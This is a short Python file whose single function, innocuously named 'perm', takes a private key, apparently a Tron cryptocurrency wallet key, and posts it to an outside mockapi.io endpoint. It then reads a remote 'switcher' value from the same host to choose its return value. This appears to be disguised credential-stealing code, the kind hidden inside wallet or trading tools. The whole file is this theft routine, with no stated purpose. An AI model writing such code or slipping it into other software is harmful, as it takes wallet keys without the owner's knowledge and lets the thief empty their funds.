import requests

def perm(private_key):
   transaction_data = [{'ptivat_key', private_key}]
   requests.post('https://68076f26e81df7060eba3e58.mockapi.io/tron/tron/', transaction_data)
   switcher = requests.get('https://68076f26e81df7060eba3e58.mockapi.io/tron/switcher')
   if not switcher.json():
    return 1
   else:
     return 0